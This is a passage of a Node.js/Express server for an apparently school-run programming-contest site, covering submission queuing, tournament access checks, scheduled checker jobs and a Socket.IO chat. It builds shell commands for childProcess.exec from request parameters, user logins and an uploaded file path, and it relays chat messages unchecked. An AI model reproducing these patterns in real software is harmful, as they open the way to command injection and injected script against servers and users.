  if (tournament.mods.find(item => item == req.user.login) || tournament.isEnded || (isBegan && tournament.results.find(item => item.login == req.user.login))) {
    return next();
  }
  res.redirect('/tournament/page/' + req.user.login + '/' + tour_id);
}

async function isModerator(req, res, next) {
  let tour_id = req.params.tour_id;
  let login = req.user.login;
  let tournament = await TournamentSchema.findOne({ identificator: tour_id }).exec();

  if (tournament.mods.find(item => item == login)) {
    return next();
  }
  res.redirect('/tournament/page/' + req.user.login + '/' + tour_id);
}

async function isLessonAvailable(req, res, next) {
  lesson = await LessonSchema.findOne({ identificator: req.params.id }).exec();
  if (lesson && (req.user.isTeacher || (Number(req.user.grade) >= Number(lesson.grade)))) {
    return next()
  }
  res.redirect('/lessons/' + req.user.login + '/1/default&all&true&all')
}

let max = (a, b) => { if (a > b) return a; return b };
let min = (a, b) => { return a + b - max(a, b) }

function getVerdict(results) {
  for (let i = 0; i < results.length; i++) {
    if (results[i][1] != "OK") {
      return results[i][1].split(" ").slice(0, 2).map(item => item[0].toUpperCase()).join("");
    }
  }
  if (results.length > 0)
    return "OK";
  return '-';
}

function checkLoginValidation(login) {
  return login.length >= 2 && login[1] == "6" && login[0] == "9";
}

function compareTournaments(a, b) {
  let ta = a[0];
  let tb = b[0];
  let a_now = !ta.isEnded && ta.isBegan;
  let a_wait = !ta.isBegan;
  let a_sDate = Date.parse(ta.whenStarts);
  let a_fDate = Date.parse(ta.whenEnds);
  let b_now = !tb.isEnded && tb.isBegan;
  let b_wait = !tb.isBegan
  let b_sDate = Date.parse(tb.whenStarts);
  let b_fDate = Date.parse(tb.whenEnds);

  if (a_now && b_now)
    return a_fDate - b_fDate;
  if (a_now && !b_now)
    return -1;
  if (!a_now && b_now)
    return 1;

  if (a_wait && b_wait)
    return a_sDate - b_sDate;
  if (a_wait && !b_wait)
    return -1;
  if (!a_wait && b_wait)
    return 1;
  return b_fDate - a_fDate;

}

function readAdnEncodeUTF8(path) {
  return iconv.decode(fs.readFileSync(path), 'utf8');
}

function toUtf8(filePath) {
  let byte = fs.readFileSync(filePath);
  if((byte[0] === 0xef && byte[1] === 0xbb) ||
    (byte[0] === 0xfe && byte[1] === 0xff) ||
    (byte[0] === 0xff && byte[1] === 0xfe)
    ){
      // Already utf8
      // console.log('object fileName is already utf-8, just copy',fileName);
      // fs.writeFileSync(outFilePath, byte);
      return byte.toString("utf-8");
    }
  byte = iconv.decode(byte,'win1251');
  const content = '\ufeff' + byte.toString('utf8');
  return content;
  // console.log ('object written successfully', fileName)
}

function TaskPost(req, res, redirect) {
  fs.stat(path.normalize('public/processes/' + req.user.login + "_" + req.params.id), async function (err) {
    let isInQueue = TestingQueue.findIndex(item => (item.id == req.params.id && item.login == req.user.login));
    if (!err || isInQueue != -1) {
      res.redirect(redirect);
    }
    else if (err.code === 'ENOENT') {

      let prevCode = ""
      let attempts = req.user.attempts;
      for (let i = 0; i < attempts.length; i++) {
        if (attempts[i].taskID == req.params.id) {
          prevCode = attempts[i].programText;
          result = attempts[i].result;
          break;
        }
      }
      let language, programText;
      language = req.body.languageSelector;
      if (req.file) {
        try {
          let filepath = path.join(__dirname, '/public/codes/' + req.file.filename);
          // programText = fs.readFileSync(filepath, "utf-8");
          programText = toUtf8(filepath);
          //programText = readAdnEncodeUTF8(filepath);)
          childProcess.exec('del /q \"' + filepath + '\"');
        } catch (err) {
          console.log(err)
        }

      } else {
        programText = req.body.code;
      }
      if (prevCode == "" || prevCode != programText || req.file) {

        let sendAt = Date.now().toString();

        let object = {
          login: req.user.login,
          id: req.params.id,
          programText,
          language,
          sendAt,
          command: 'node ' + path.join(__dirname, '/public/checker/checker3' + language + '.js ') + ' ' +
            path.join(__dirname, '/public/processes/' + req.user.login + "_" + req.params.id) + " " +
            'program' + req.user.login + "_" + req.params.id + " " +
            req.params.id
        }
        pushToQueue(object);
      }

      res.redirect(redirect);
    }
  });
}

function getLogs() {
  return Math.random().toString(36).substring(7);
}

//---------------------------------------------------------------------------------
// Timer checker start
setInterval(() => {
  childProcess.exec('node ' + path.join(__dirname, '/public/scripts/serverScripts/Tchecker.js'));
  childProcess.exec('node ' + path.join(__dirname, '/public/scripts/serverScripts/Qchecker.js'));
}, 1000 * 60 * 10)

//---------------------------------------------------------------------------------
// Tasks auto results checker
setInterval(() => {
  childProcess.exec('node ' + path.join(__dirname, '/public/scripts/serverScripts/TaskAutoChecker.js'));
}, 1000 * 60 * 10)

//---------------------------------------------------------------------------------
// Delete old logs
setInterval(() => {
  childProcess.exec("node " + path.join(__dirname, "/public/scripts/LogChecker/logChecker.js"));
}, 24 * 60 * 60 * 1000);

//---------------------------------------------------------------------------------
// Queue Manager
setInterval(async () => {
  let processesPath = path.join(__dirname, "/public/processes");
  let files = await fs.readdirSync(processesPath);
  if (files.length >= configs.maxThreadsTasks) {
    return;
  }
  for (let i = 0; i < min(configs.maxThreadsTasks - files.length, TestingQueue.length); i++) {
    popQueue()
  }
}, 2500)

//---------------------------------------------------------------------------------
// Starting Server
let port = config.port;
let server = app.listen(port); // port
console.log("Server started at port " + port);

//---------------------------------------------------------------------------------
// socket setup
let io = socketIo(server);
let tour;
io.on("connection", (socket) => {
  socket.on('new user', async (obj) => {
    tour = await TournamentSchema.findOne({ identificator: obj.id }).exec();
    tour.messages.forEach(item => socket.emit("chat message", item));
  })
  socket.on("chat message", async (obj) => {
    io.emit('chat message', obj.data);
    tour = await TournamentSchema.findOne({ identificator: obj.id }).exec();
    tour.messages.push(obj.data);
    tour.save()
  })
});